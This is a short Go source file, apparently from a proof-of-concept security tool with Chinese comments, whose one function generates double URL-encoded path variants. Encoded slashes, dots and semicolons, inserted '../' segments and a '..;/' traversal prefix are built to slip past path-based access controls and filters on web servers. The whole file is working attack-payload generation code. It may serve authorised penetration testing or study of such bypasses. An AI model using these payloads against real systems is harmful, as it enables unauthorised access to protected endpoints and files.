package poc

import "strings"

// DoubleEncode 生成更完整的双重 URL 编码 payload
func DoubleEncode(path string) []string {
	var results []string

	// 双重编码映射
	encodings := map[string]string{
		"/": "%252f",
		".": "%252e",
		";": "%253b",
		" ": "%2520",
		"#": "%2523",
		"?": "%253f",
	}

	// 对整个路径中的 / 进行双重编码
	results = append(results, strings.ReplaceAll(path, "/", "%252f"))

	// 对路径中的 / 用 %252f 替代（保留第一个 /）
	if len(path) > 1 {
		results = append(results, "/"+strings.ReplaceAll(path[1:], "/", "%252f"))
	}

	// 在路径段之间插入双重编码的 ../
	// %252e%252e%252f = ../
	parts := strings.Split(path, "/")
	if len(parts) > 2 {
		var sb strings.Builder
		for i, part := range parts {
			if part == "" && i == 0 {
				sb.WriteString("/")
				continue
			}
			if part == "" {
				continue
			}
			sb.WriteString(part)
			if i < len(parts)-1 {
				sb.WriteString("/%252e%252e/")
			}
		}
		results = append(results, sb.String())
	}

	// 对每种编码字符进行替换生成变体
	for orig, encoded := range encodings {
		if strings.Contains(path, orig) {
			results = append(results, strings.ReplaceAll(path, orig, encoded))
		}
	}

	// 双重编码的 ..;/ 遍历
	results = append(results, "/%252e%252e%253b/"+strings.TrimPrefix(path, "/"))

	return results
}
